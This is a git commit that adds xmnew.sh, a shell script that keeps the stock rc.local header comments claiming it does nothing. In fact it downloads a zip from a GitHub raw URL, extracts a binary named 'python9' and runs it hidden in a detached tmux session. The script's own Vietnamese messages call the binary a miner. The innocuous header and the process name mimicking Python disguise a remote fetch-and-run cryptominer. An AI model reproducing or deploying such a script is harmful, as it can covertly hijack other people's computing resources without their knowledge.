aa28617a7b16ec51b88d7cdfc07f3954594b1527
haidanglx <40859600+haidanglx@users.noreply.github.com>
2019-06-26 14:24:09 +0700

    Create xmnew.sh

---
+++ xmnew.sh
@@ -0,0 +1,31 @@
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+if [ -f ${PWD}/python9 ]; then
+    if pgrep -x "python9" > /dev/null
+then
+    echo "Miner dang chay roi , ke cmn di "
+    
+else
+
+echo "Miner da install , chay thoi "
+./python9
+
+     
+fi
+exit
+fi
+sudo apt-get install tmux unzip -y
+wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/xmnew.zip
+unzip xmnew.zip
+chmod +x python9
+tmux new-session -d -s my_session1 './python9'
